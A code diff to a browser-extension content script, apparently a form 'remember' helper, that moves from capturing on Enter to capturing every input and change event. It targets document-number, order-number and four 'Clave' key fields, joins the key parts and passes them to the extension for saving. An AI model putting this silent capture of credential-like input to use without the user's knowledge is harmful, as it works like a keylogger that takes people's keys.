@@ -1,7 +1,9 @@
 (() => {
 const CONTENT_STATE_KEY = '__shalomRecordarContentState__';
-const DOC_LISTENER_KEY = '__shalomRecordarDocumentKeydownListener__';
+const DOC_INPUT_ID = 'inputnombre';
+const OS_INPUT_ID = 'inputnroguia';
 const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
+const DEDUPE_WINDOW_MS = 1500;
 
 function getContentState() {
     const globalState = globalThis[CONTENT_STATE_KEY] || {};
@@ -55,18 +57,43 @@ function isClaveField(target) {
 }
 
 function isOsField(target) {
-    return getInputId(target) === 'inputnroguia';
+    return getInputId(target) === OS_INPUT_ID;
 }
 
 function isDocumentField(target) {
-    return getInputId(target) === 'inputnombre';
+    return getInputId(target) === DOC_INPUT_ID;
 }
 
-function shouldIgnoreKeydown(event) {
-    return event.defaultPrevented || event.isComposing || event.key !== 'Enter' || event.shiftKey || event.altKey || event.ctrlKey || event.metaKey;
+function isRelevantField(target) {
+    return isClaveField(target) || isOsField(target) || isDocumentField(target);
+}
+
+function shouldCapture(event) {
+    return Boolean(event)
+        && !event.defaultPrevented
+        && !event.isComposing
+        && (event.type === 'input' || event.type === 'change');
+}
+
+function canSendCapture(state, dedupeKey, eventTimeStamp) {
+    const now = typeof eventTimeStamp === 'number' && Number.isFinite(eventTimeStamp) ? eventTimeStamp : Date.now();
+    const previous = state.lastCaptureByKey?.[dedupeKey];
+    if (previous && now - previous < DEDUPE_WINDOW_MS) {
+        return false;
+    }
+
+    state.lastCaptureByKey ||= {};
+    state.lastCaptureByKey[dedupeKey] = now;
+    return true;
 }
 
 function sendCapture(field, value, source, eventTimeStamp) {
+    const state = getContentState();
+    const dedupeKey = [source, field, value].join('|');
+    if (!canSendCapture(state, dedupeKey, eventTimeStamp)) {
+        return;
+    }
+
     chrome.runtime.sendMessage({
         action: 'saveData',
         data: {
@@ -79,43 +106,63 @@ function sendCapture(field, value, source, eventTimeStamp) {
     });
 }
 
-function captureOnEnter(event) {
-    if (shouldIgnoreKeydown(event)) return;
+function captureDocument(target, source, eventTimeStamp) {
+    const classified = classifyDocumentValue(getFieldValue(target));
+    if (!classified) return;
+    sendCapture(classified.field, classified.value, source, eventTimeStamp);
+}
+
+function captureOs(target, source, eventTimeStamp) {
+    const value = normalizeText(getFieldValue(target));
+    if (!/^\d+$/.test(value)) return;
+    sendCapture('OS', value, source, eventTimeStamp);
+}
+
+function captureClave(target, source, eventTimeStamp) {
+    const value = normalizeText(getFieldValue(target));
+    if (!value) return;
+
+    const visibleFields = CLAVE_FIELDS
+        .map((fieldId) => document.getElementById(fieldId))
+        .filter(Boolean);
+    const claveCompleta = visibleFields.length > 0
+        ? visibleFields.map((field) => normalizeText(getFieldValue(field))).join('')
+        : value;
+
+    if (!claveCompleta) return;
+    sendCapture('Clave', claveCompleta, source, eventTimeStamp);
+}
+
+function handleCapture(event) {
+    if (!shouldCapture(event)) return;
 
     const target = event.target;
     if (!isCaptureTarget(target)) return;
 
     const source = getInputSource(target);
-
-    if (isClaveField(target)) {
-        const value = normalizeText(getFieldValue(target));
-        if (!value) return;
-        sendCapture('Clave', value, source, event.timeStamp);
-        return;
-    }
+    if (!isRelevantField(target)) return;
 
     if (isOsField(target)) {
-        const value = normalizeText(getFieldValue(target));
-        if (!value) return;
-        sendCapture('OS', value, source, event.timeStamp);
+        captureOs(target, source, event.timeStamp);
         return;
     }
 
-    if (!isDocumentField(target)) return;
+    if (isClaveField(target)) {
+        captureClave(target, source, event.timeStamp);
+        return;
+    }
 
-    const classified = classifyDocumentValue(getFieldValue(target));
-    if (!classified) return;
-
-    sendCapture(classified.field, classified.value, source, event.timeStamp);
+    if (isDocumentField(target)) {
+        captureDocument(target, source, event.timeStamp);
+    }
 }
 
 function ensureDocumentListener() {
     const state = getContentState();
     if (state.documentListenerAttached) return;
     state.documentListenerAttached = true;
-    if (globalThis[DOC_LISTENER_KEY]) return;
-    globalThis[DOC_LISTENER_KEY] = captureOnEnter;
-    document.addEventListener('keydown', captureOnEnter, true);
+    document.addEventListener('input', handleCapture, true);
+    document.addEventListener('change', handleCapture, true);
 }
 
 function ensureMutationObserver() {
